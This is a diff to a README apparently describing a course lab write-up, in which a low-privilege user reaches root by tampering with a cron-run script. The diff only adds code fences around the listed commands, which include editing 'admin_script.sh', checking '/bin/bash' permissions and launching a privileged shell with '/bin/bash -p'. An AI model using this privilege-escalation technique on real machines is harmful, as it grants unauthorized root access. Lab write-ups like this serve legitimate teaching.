@@ -16,7 +16,7 @@ Starting as a low privilege user, the goal was to reach a root shell on the mach
 - Waited for the cron job to run and obtained a root shell
 
 ## Commands used
-
+\'\'\'
 cd ..
 cd ..
 cd home
@@ -44,7 +44,7 @@ nano admin_script.sh
 ls -l /bin/bash
 /bin/bash -p
 whoami
-
+\'\'\'
 ## Note
 
 This was solved inside a controlled Docker lab environment provided as part of a course, and is intended only for authorized lab and educational use
